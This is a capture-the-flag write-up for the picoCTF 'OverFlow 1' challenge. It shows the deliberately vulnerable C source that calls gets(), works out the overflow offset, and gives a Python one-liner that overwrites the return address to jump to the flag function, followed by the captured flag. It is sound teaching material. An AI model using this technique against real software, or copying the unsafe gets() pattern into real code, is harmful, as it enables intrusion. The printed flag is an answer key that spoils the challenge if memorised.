# OverFlow 1
## Question
>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this [program](files/vuln)? You can find it in `/problems/overflow-1_2_305519bf80dcdebd46c8950854760999` on the shell server. [Source](files/vuln.c).

## Hint
>Take control that return address

>Make sure your address is in Little Endian.

# Solution
## Source Code
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include "asm.h"

#define BUFFSIZE 64
#define FLAGSIZE 64

void flag() {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  printf(buf);
}

void vuln(){
  char buf[BUFFSIZE];
  gets(buf);

  printf("Woah, were jumping to 0x%x !\n", get_return_address());
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  puts("Give me a string and lets see what happens: ");
  vuln();
  return 0;
}
```

## Vulnerability
The code is vulnerable to a buffer overflow (`gets(buf)`). As the buffer is 64 bytes, let's try to create a segfault.

We send 68 bytes:
~~~~
$ python -c "print('A'*68)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
~~~~

Not enough to create a segfault. Let's add 4 more bytes:
~~~~
$ python -c "print('A'*72)" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x8048705 !
Segmentation fault (core dumped)
~~~~

OK, now we now there is a segfault at 72 bytes (`'A'*72`). Now, we need to add 4 bytes for the return address (`'B'*4`), and to concatenate the address of `flag`:
~~~~
$ readelf -s vuln | grep flag
    74: 080485e6   121 FUNC    GLOBAL DEFAULT   14 flag
$ python -c "import pwn; print(pwn.p32(0x80485e6))"
b'\xe6\x85\x04\x08'
~~~~

Now, we need to concatenate all these:
* `'A'*72`: to overflow the buffer
* `'B'*4`: for the return address
* `'\xe6\x85\x04\x08'`: address of `flag` where we want to jump

## Exploit
~~~~
$ python -c "print('A'*72 + 'B'*4 + '\xe6\x85\x04\x08')" | ./vuln
Give me a string and lets see what happens: 
Woah, were jumping to 0x80485e6 !
picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a32b9368}Segmentation fault (core dumped)
~~~~

# Flag
`picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a32b9368}`
